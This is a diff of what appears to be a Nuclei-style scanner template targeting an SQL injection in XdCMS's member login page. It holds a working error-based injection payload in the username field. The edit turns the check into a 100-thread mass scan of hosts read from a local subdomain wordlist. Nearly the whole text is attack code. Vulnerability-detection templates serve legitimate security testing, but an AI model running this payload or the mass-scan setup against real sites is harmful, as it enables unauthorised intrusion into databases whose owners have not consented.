@@ -4,35 +4,37 @@ info:
   name: XdCMS SQL Injection
   author: pikpikcu
   severity: high
-  reference:
-    - https://www.uedbox.com/post/35188/
+  reference: https://www.uedbox.com/post/35188/
   tags: sqli,xdcms
 
-variables:
-  num: "999999999"
-
 requests:
-  - method: POST
-    path:
-      - "{{BaseURL}}/index.php?m=member&f=login_save"
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-    body: |
-      username=dd' or extractvalue(0x0a,concat(0x0a,md5({{num}})))#&password=dd&submit=+%B5%C7+%C2%BC+
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /index.php?m=member&f=login_save HTTP/1.1
+        Host: {{Subdomains}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        
+        username=dd' or extractvalue(0x0a,concat(0x0a,810663301*872821376))#&password=dd&submit=+%B5%C7+%C2%BC+
     matchers-condition: and
     matchers:
-
       - type: word
         words:
           - "Content-Type: text/html"
         part: header
-
       - type: word
         words:
-          - '{{md5({{num}})}}'
+          - "707564257851522176"
+          - "XPATH syntax error:"
         part: body
-
+        condition: and
       - type: status
         status:
           - 200
